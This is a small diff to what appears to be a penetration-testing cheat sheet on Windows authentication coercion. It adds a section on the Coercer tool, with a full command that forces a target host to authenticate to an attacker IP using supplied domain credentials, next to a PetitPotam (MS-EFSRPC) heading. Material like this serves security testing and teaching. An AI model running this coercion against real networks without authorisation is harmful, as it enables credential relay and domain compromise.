@@ -4,6 +4,15 @@ ___
 
 
 
+## Multi-Method
+___
+
+**Coercer will attempt 12 different methods to coerce authentication: ([coercer](https://github.com/p0dalirius/Coercer))**
+
+```bash
+python3 coercer.py coerce -l <attackerIP> -t <targetIP> -u 'user' -p 'pass' -d <domain.local> -v
+```
+
 ## PetitPotam (MS-EFSRPC)
 ___
 ### Attack requirements
